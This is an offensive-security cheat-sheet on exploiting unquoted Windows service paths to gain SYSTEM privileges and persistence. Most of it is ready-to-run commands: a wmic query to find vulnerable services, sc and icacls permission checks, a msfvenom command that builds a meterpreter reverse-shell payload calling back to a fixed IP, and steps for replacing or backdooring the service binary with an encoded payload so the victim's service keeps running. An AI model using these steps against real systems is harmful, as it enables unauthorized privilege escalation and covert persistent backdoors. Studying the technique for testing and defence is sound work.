# Unquoted Service Path
We can leverage how Windows searches for a service executable when the service path is unquoted to **escalate privilege** and/or **create persistence**. 

We can use metasploit (need a meterpreter session) or do it mannunally (need a shell). 

## Metasploit
```
exploit/windows/local/unquoted_service_path
```

## Manual Exploitation
In Windows cmd, find a service with the unquoted service path with `wmic`
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
* this finds the service name, service display name, executable path, and start mode in all the directories except C:\Windows\ (since  by default there is no such service which has spaces and is unquoted in  this folder); filtering by start mode auto and excluding those with quoted service path
* findstr
  * /i : case insensitive
  * /v : Prints only lines that don't contain a match

Check if we can stop and start the service ourselves:
```
sc stop <service-name>
sc start <service-name>
```
* If `access denied`, we can use the fact that the service auto starts on boot, rebooting the system to restart the service

Check if the service run on a higher privilege than what we already have (as a domain user):
```
sc qc <service-name>
# look for SERVICE_START_TIME LocalSystem
```
* this shall give us system privilege

Next, check the write/modification permission in our target folder(s) to see which one we have permission to write into. We're looking for `(M)` (for modification) or `(W)` 
```
icacls "C:\Program Files"
```
* generally a user wouldn't have access to write to `C:/` 

Write/Modification:
> Modify: Allows users to read and write of files and subfolders; also allows deletion of the folder.  
> Write: Allows users to add files and subfolders, allows you to write to a file.

<img src="https://miro.medium.com/max/658/1*z1_WPoIRR6p5et1samB4AA.png" width=60%>

No Write:

<img src="https://miro.medium.com/max/700/1*BphXGBP9miqyz-mPMZZbDQ.png" width=80%>

FInd a list of users in the "Administrators" localgroup:
```
net localgroup "Administrators"
```

<br>

After choosing the folder path, we can upload our payload here and stop and start the service. 

Payload example:
```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.100 LPORT=5353 -a x86 -f exe > fun.exe
```

### Replacing the Service
If we only have M/W permission to the folder where the exe is, we're going to **replace the running service** with our own exe. 

The service is running so we can't just write over it. So first, rename the service: 
```
mv service.exe service_bak.exe
``` 

and then upload our file 
```
upload /path/to/payload service.exe
```

Before firing off the handler, **MIGRATION NEEDS TO BE SET UP FIRST**. Otherwise session will die soon after the exploit succeeds because Windows didn't successfully start the legitimate service. By default, <ins>Windows would kill the process</ins> if the service does not successfully start, and we lose our session.

to set up auto-migration, in handler:
```
set AutoRunScript post/windows/manage/migrate
```

#### Another Option: Injecting Payload into the Binary
Another option is to inject the payload into the original exe. Here, we're going to download the exe, inject the payload into the binary file with `msfvenom` and upload it back. This makes sure our session stays alive and the victim's service runs as usual. 

HOWEVER, you need to stop the service first to upload over the exe. This could be done by `sc stop` (if you have the permission to do so), or you first upload a dummy `service.exe`, reboot, let windows kill the process, upload the injected file, and reboot again. 

Injection:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.100 LPORT=5353 -f exe -e x86/shikata_ga_nai -i 15 -k -x service_bak.exe > service.exe
```
* `-x`: Specify what executable file (to use as a template) to inject the payload into
* `-k`: Preserve the template behavior and inject the payload as a new thread
* `-e x86/shikata_ga_nai -i 15`: Encoding the payload 15 times using shikata_ga_nai

[a similar example](https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/)

[more example](http://insecurety.net/injecting-arbritary-metasploit-payloads-into-windows-executables/)